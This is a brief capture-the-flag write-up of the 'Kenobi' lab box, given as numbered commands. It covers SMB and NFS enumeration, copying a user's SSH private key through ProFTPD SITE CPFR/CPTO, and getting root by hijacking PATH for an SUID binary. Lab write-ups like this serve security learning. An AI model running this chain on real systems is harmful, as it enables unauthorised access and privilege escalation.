# CTF Writeup: Kenobi

---

- Step 1: added <target_ip> to /etc/hosts & ran nmap scan --> 21,22,80,111,139,445,2049 open
- Step 2: made smbmap -H target_ip and found /anonymous readable samba share
- Step 3: made smbclient //kenobi.thm/anonymous --> retrieved log.txt
- Step 4: revealed that private ssh key of kenobi user is there
- Step 5: we have mount on /var and there is an certain ftpsd exploit which allows me
to copy files from one directory to another on the server
- Step 6: made nc targetip and 21 --> made site cpfr /home/kenobi/.ssh/id_rsa 
--> made site cpto /var/tmp/id_rsa
- Step 7: sudo mkdir /mnt/kenobiNFS to replicate mount system
- Step 8: made mount target_ip:/var /mnt/kenobiNFS
- Step 9: made sudo mount target_ip:/var /mnt/kenobiNFS --> mounted /var dir from server
into local machine
- Step 10: gained private key --> cp /mnt/kenobiNFS/tmp/id_rsa . --> into /Desktop 
- Step 11: made chmod 600 id_rsa
- Step 12: made ssh -i id_rsa kenobi@target_ip --> gained ssh --> retrieved user flag
- Step 13: made find / -perm /4000 2>/dev/null --> /usr/bin/menu --> SUID 
- Step 14: made strings /usr/bin/menu --> scrolled up and saw no absolute path --> exploitable
- Step 15: made echo /bin/sh > curl --> made chmod 777 curl --> made export PATH=/tmp:$PATH 
- Step 16: executed /usr/bin/menu again and gained root
- Step 17: retrieved root flag

---

## Key Learnings

- Immensly increased knowledge of mounting --> nfs
- SLightly increased knowledge of samba shares
- Increased knowledge of SUID and SGID 
- Increased Knowledge of Privilege Escelation
- Increased Knowledge of CVE Enumeration
